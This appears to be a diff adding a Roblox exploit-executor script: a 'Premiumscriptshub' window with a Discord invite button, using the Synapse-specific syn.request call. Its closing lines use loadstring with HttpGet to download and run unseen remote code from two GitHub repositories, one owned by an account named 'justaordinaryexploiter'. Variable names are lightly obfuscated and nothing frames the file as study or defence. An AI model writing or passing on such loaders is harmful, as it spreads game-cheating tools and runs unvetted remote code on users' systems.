@@ -1,0 +1,50 @@
+local _7383=game:GetService("Players").LocalPlayer
+local _393=Instance.new("ScreenGui")
+_393.Name="PremiumscriptshubGUI"
+_393.ResetOnSpawn=false
+_393.Parent=_7383:WaitForChild("PlayerGui")
+local _8393=Instance.new("Frame")
+_8393.Size=UDim2.new(0,400,0,200)
+_8393.Position=UDim2.new(0.5,-200,0.5,-100)
+_8393.BackgroundColor3=Color3.fromRGB(30,30,30)
+_8393.BorderSizePixel=0
+_8393.Parent=_393
+local _4728=Instance.new("TextLabel")
+_4728.Size=UDim2.new(1,0,0,50)
+_4728.Position=UDim2.new(0,0,0,0)
+_4728.BackgroundTransparency=1
+_4728.Text="Premiumscriptshub"
+_4728.TextColor3=Color3.fromRGB(255,255,255)
+_4728.Font=Enum.Font.SourceSansBold
+_4728.TextScaled=true
+_4728.Parent=_8393
+local _5829=Instance.new("TextLabel")
+_5829.Size=UDim2.new(1,0,0,30)
+_5829.Position=UDim2.new(0,0,0,50)
+_5829.BackgroundTransparency=1
+_5829.Text="Heatherscripts"
+_5829.TextColor3=Color3.fromRGB(200,200,200)
+_5829.Font=Enum.Font.SourceSans
+_5829.TextScaled=true
+_5829.Parent=_8393
+local _9142=Instance.new("TextButton")
+_9142.Size=UDim2.new(0,200,0,50)
+_9142.Position=UDim2.new(0.5,-100,1,-70)
+_9142.BackgroundColor3=Color3.fromRGB(60,120,240)
+_9142.Text="Discord Link"
+_9142.TextColor3=Color3.fromRGB(255,255,255)
+_9142.Font=Enum.Font.SourceSansBold
+_9142.TextScaled=true
+_9142.Parent=_8393
+_9142.MouseButton1Click:Connect(function()
+    local _1257="https://discord.gg/UvASt9rPeh"
+    if syn then syn.request({Url=_1257,Method="GET"}) else print("Discord link:",_1257) end
+end)
+
+-- Load external scripts
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/justaordinaryexploiter/fuckingsourcerepo/refs/heads/fekeyboard/main"))()
+end)
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/inkdupe/hat-scripts/refs/heads/main/updatedhathub.lua"))()
+end)
